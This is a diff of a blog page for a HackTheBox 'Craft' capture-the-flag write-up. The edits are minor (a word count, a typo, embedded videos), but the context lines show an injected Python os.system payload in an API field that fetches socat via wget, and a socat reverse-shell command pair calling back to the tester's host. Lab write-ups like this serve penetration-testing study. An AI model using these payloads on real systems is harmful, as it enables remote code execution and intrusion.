@@ -46,7 +46,7 @@
 <meta itemprop="description" content="Delve deep into the perils of programming on craft beer.">
 <meta itemprop="datePublished" content="2020-01-04T14:00:00&#43;00:00" />
 <meta itemprop="dateModified" content="2020-01-04T00:00:00&#43;00:00" />
-<meta itemprop="wordCount" content="2542">
+<meta itemprop="wordCount" content="2541">
 <meta itemprop="image" content="/"/>
 
 
@@ -335,7 +335,7 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
 <p><code>brew_dict['abv'] = '**import**(&quot;os&quot;).system(&quot;wget http://10.10.14.15:8000/socat &quot;)'</code></p>
 <p>Then run the script:</p>
 <p><code>python3 make_shell.py</code></p>
-<p>And finally check the if our server was accessed:</p>
+<p>And finally check if our server was accessed:</p>
 
     <figure class="left" >
         <img src="image-1.webp"   />
@@ -344,7 +344,9 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
     </figure>
 
 
-<!-- raw HTML omitted -->
+
+<video src="swanson.webm" loop autoplay></video>
+
 <p>Success! It's not a shell, but it's a start and confirms that I can execute commands on the machine. It's time to modify the script to have it use socat to create a reverse shell. I can do this using the following commands:</p>
 <p>Listener: <code>socat file:$(tty),raw,echo=0 tcp-listen:44226</code></p>
 <p>Victim: <code>socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:44226</code></p>
@@ -365,7 +367,9 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
     </figure>
 
 
-<!-- raw HTML omitted -->
+
+<video src="2.webm" loop autoplay></video>
+
 <p>Success! But&hellip; wait&hellip; I'm root? Hmmm&hellip; that seemed very suspicious to me. I started poking around and found:</p>
 <ol>
 <li>My socat binary didn't work, has a syntax error.</li>
@@ -465,7 +469,9 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
     </figure>
 
 
-<!-- raw HTML omitted -->
+
+<video src="thumbsup.webm" loop autoplay></video>
+
 <p>There's the user flag. I was almost stymied at the required passphrase on the key, but the same password Gilfoyle used for git was used here! For shame&hellip; for as much smack as Gilfoyle talks on Dinesh, he has reused his password in three places here.</p>
 <p>Now that we have a solid foothold it's time to escalate our priveleges.</p>
 <hr>
@@ -549,7 +555,9 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
     </figure>
 
 
-<!-- raw HTML omitted -->
+
+<video src="success.webm" loop autoplay></video>
+
 <p>A very cool box. Until next time hackers, this is jivex5k signing off!</p>
 
             </div>
@@ -562,7 +570,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="/tags/ctf">ctf</a></span><span class="tag"><a href="/tags/hackthebox">HackTheBox</a></span><span class="tag"><a href="/tags/pentesting">pentesting</a></span><span class="tag"><a href="/tags/git">Git</a></span><span class="tag"><a href="/tags/python">Python</a></span><span class="tag"><a href="/tags/custom-exploitation">Custom Exploitation</a></span>
                 </p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>2542 Words</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>2541 Words</p>
 
             <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-01-04 00:00 &#43;0000</p>
         </div>
